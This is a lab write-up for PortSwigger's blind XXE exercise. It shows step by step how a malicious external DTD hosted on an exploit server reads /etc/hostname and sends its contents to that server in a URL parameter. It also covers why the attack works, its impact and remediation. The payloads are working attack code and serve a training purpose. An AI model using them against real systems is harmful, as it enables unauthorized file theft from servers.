# XXE Injection: Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Blind XML External Entity Injection, Out-of-Band Data Exfiltration (CWE-611)

## Lab Objective
The application's stock-check functionality parses user-supplied XML but does not display the XML parser's output. The objective is to exploit this blind XXE vulnerability by hosting a malicious external DTD on the attacker-controlled Exploit Server.

The malicious DTD instructs the XML parser to:
1. Read a sensitive local file from the target server (`/etc/hostname`).
2. Dynamically construct an external entity containing the file's contents.
3. Trigger an HTTP request to the attacker's Exploit Server, transmitting the extracted data as a URL parameter.

The final objective is to retrieve the leaked file contents through the Exploit Server's Access Log.

## Vulnerability Overview

This lab builds upon the previous blind XXE lab, where XML parameter entities were used to trigger out-of-band (OOB) interactions through Burp Collaborator.

However, instead of simply confirming that the XML parser can make external network requests, this lab demonstrates how the same capability can be leveraged to **exfiltrate sensitive files from the target server**.

In a traditional XXE vulnerability, an attacker might define an external entity referencing a local file:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

When the application processes and displays the entity, the attacker can directly retrieve the file contents in the HTTP response.

In a blind XXE scenario, the application does not return the resolved entity's value. Therefore, an alternative communication channel is required.

This is where a malicious external DTD becomes useful.

An attacker hosts a specially crafted DTD on an external server. When the vulnerable XML parser loads this DTD, it executes a sequence of parameter entity declarations that read a local file and transmit its contents to an attacker-controlled endpoint.

The key technique involves dynamically constructing a parameter entity declaration using another parameter entity.

Three important components make this possible:

- **External DTD:** A malicious Document Type Definition hosted on the attacker's Exploit Server.
- **File-reading entity:** A parameter entity that references a local file using the `file://` protocol.
- **Exfiltration entity:** A dynamically constructed external entity that makes an HTTP request containing the extracted file contents.

## Methodology

1. **Identify the XML injection point.** Locate the application's stock-check functionality and intercept its XML request using Burp Suite.
2. **Confirm blind XXE behavior.** Determine whether the application processes XML input and whether external DTD resolution can be triggered.
3. **Prepare a malicious external DTD.** Configure the Exploit Server to host a DTD containing parameter entities responsible for reading and exfiltrating file contents.
4. **Reference the external DTD.** Modify the original XML request to load the malicious DTD from the Exploit Server.
5. **Trigger the exploitation chain.** Send the modified request, causing the XML parser to read the target's local file and initiate an external HTTP request.
6. **Retrieve the extracted data.** Inspect the Exploit Server's Access Log to obtain the file contents transmitted through the URL parameter.

---

## Exploitation

### Step 1: Intercept the stock-check request

Navigate to the product page, add a product to the cart, and click **Check stock**.

Intercept the resulting request using Burp Suite and send it to Repeater.

The request contains XML data similar to:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

The application processes this XML to retrieve stock information.

Since the XML input is user-controlled, it provides an opportunity to investigate potential XXE vulnerabilities.

### Step 2: Prepare the malicious external DTD

Navigate to the **Exploit Server** provided by PortSwigger.

Scroll down to the Body section and configure the following malicious DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-EXPLOIT-SERVER/?x=%file;'>">
%eval;
%exfil;
```

Replace `YOUR-EXPLOIT-SERVER` with your actual Exploit Server hostname.

The DTD contains four important operations:

**1. Read the local file**

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
```

Declares a parameter entity named `file` that references `/etc/hostname` on the target server.

When resolved, the entity contains the file's contents.

**2. Dynamically construct another entity**

```xml
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-EXPLOIT-SERVER/?x=%file;'>">
```

Declares another parameter entity named `eval`.

Its value contains a declaration for a third parameter entity named `exfil`.

The `&#x25;` character reference represents the `%` character in hexadecimal notation. It allows the dynamically generated declaration to contain the parameter entity syntax.

The `%file;` reference is substituted with the contents of the local file when the declaration is constructed.

**3. Execute the dynamically generated declaration**

```xml
%eval;
```

Expands the `eval` entity, causing the XML parser to process the dynamically generated `exfil` entity declaration.

**4. Trigger data exfiltration**

```xml
%exfil;
```

References the newly declared external parameter entity.

When resolved, it causes the XML parser to make an HTTP request to the attacker-controlled Exploit Server, with the extracted file contents included in the `x` URL parameter.

Keep the Exploit Server response headers configured as:

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
```

Click **Store** to save the malicious DTD.

### Step 3: Modify the original XML request

Return to Burp Suite Repeater.

Replace the original XML request body with the following payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY % loadDtd SYSTEM "https://YOUR-EXPLOIT-SERVER/exploit">
    %loadDtd;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Replace the hostname with your actual Exploit Server hostname.

Here, the request performs two important operations:

- Declares a parameter entity named `loadDtd` that references the malicious external DTD hosted on the Exploit Server.
- Expands `%loadDtd;`, instructing the XML parser to retrieve and process the external DTD.

The external DTD then handles the remaining exploitation process, including file reading and data exfiltration.

An important distinction is that the original XML request does not need to declare or execute `%file`, `%eval`, or `%exfil` individually. These entities are defined and executed inside the externally hosted DTD.

### Step 4: Trigger the exploitation

Click **Send** in Burp Repeater.

The application processes the XML document, loads the external DTD, and executes its parameter entity declarations.

The XML parser reads `/etc/hostname` and attempts to transmit its contents through an HTTP request to the Exploit Server.

The application's HTTP response does not necessarily contain the extracted file contents. This is expected because the attack relies on an out-of-band communication channel rather than direct response disclosure.

### Step 5: Retrieve the exfiltrated data

Return to the Exploit Server and click **Access log**.

Look for an incoming HTTP request resembling:

```http
GET /?x=<extracted-file-contents> HTTP/1.1
```

The value of the `x` parameter contains the contents of `/etc/hostname` extracted from the target server.

This confirms that the XML parser successfully resolved the external entities and transmitted the local file contents to the attacker-controlled server.

### Step 6: Submit the solution

Return to the PortSwigger Web Security Academy lab page.

Click **Submit solution**.

The lab should now be marked as solved.

---

## Why It Works

The vulnerability exists because the application's XML parser allows external DTD processing and parameter entity resolution.

Although the application does not display the results of XML entity processing, the parser can still initiate external network requests.

The malicious external DTD takes advantage of this behavior by chaining multiple parameter entities together.

The exploitation process can be summarized as follows:

```text
                ATTACKER
                   |
                   |
          Burp Repeater Request
                   |
                   |
          Vulnerable Application
                   |
                   |
              XML Parser
                   |
                   |
          Loads External DTD
                   |
                   |
             Exploit Server
                   |
                   |
           Declares %file
                   |
                   |
        Reads /etc/hostname
                   |
                   |
           Executes %eval
                   |
                   |
       Dynamically declares %exfil
                   |
                   |
           Executes %exfil
                   |
                   |
        HTTP Request to Attacker
                   |
                   |
       File Contents in URL Parameter
                   |
                   |
          Exploit Server Access Log
                   |
                   |
          SUCCESSFUL EXFILTRATION
```

The critical technique is the dynamic construction of the `%exfil` parameter entity.

Rather than attempting to retrieve the file contents through the application's HTTP response, the attacker makes the vulnerable server transmit the information to an external endpoint.

This demonstrates how blind XXE can escalate from a simple external interaction into actual sensitive data disclosure.

## Impact

- **Sensitive file disclosure:** Attackers may retrieve local files containing system information, application configuration, credentials, or other sensitive data, depending on file permissions and parser behavior.
- **Out-of-band data exfiltration:** Information can be transmitted through external HTTP or DNS interactions even when the application does not return the XML parser's output.
- **Server-side request generation:** The vulnerable application can be manipulated into initiating network requests to attacker-controlled infrastructure.
- **Internal information exposure:** Depending on the environment and network configuration, similar techniques may expose information from internal resources.
- **Potential escalation:** XXE vulnerabilities can sometimes be chained with other weaknesses to achieve more serious impacts, depending on the application's configuration.

## Remediation

- **Disable external entity resolution:** Configure XML parsers to prevent the resolution of external general entities and parameter entities.
- **Disable DTD processing:** If the application does not require DTD functionality, disable DTD processing entirely.
- **Use secure parser configurations:** Enable secure processing features and explicitly restrict external DTD and schema access.
- **Restrict outbound network access:** Apply network-level controls to prevent application servers from making unnecessary requests to external destinations.
- **Avoid relying on input filtering:** Blocking specific entity declarations is insufficient because XML supports multiple entity mechanisms and declaration forms.
- **Use safer data formats:** Where possible, consider alternatives such as JSON for application features that do not require XML processing.

## Key Takeaways

- Blind XXE does not mean that the vulnerability cannot be exploited. Even when the application does not display entity contents, external interactions can provide an alternative data extraction channel.
- External DTDs allow attackers to move exploitation logic outside the original XML document.
- XML parameter entities (`%name;`) can be used to construct and execute additional entity declarations dynamically.
- The `&#x25;` character reference represents `%` and is particularly useful when constructing parameter entity declarations inside another entity's value.
- Out-of-band exfiltration allows attackers to retrieve sensitive information without relying on the application's HTTP response.
- The distinction between the original XML request and the externally hosted DTD is important: the original request loads the DTD, while the DTD performs the actual exploitation.
- A successful external HTTP interaction containing the target file's contents confirms that blind XXE has escalated into actual data exfiltration.

## Tools Used

- Burp Suite Professional (Proxy, Repeater)
- PortSwigger Web Security Academy Exploit Server
- Web Browser
- XML External Entity (XXE) Payloads

## Disclaimer

This writeup documents an intentionally vulnerable lab provided by PortSwigger Web Security Academy for educational and authorized security testing purposes. The techniques described should only be used against systems you own or have explicit permission to assess.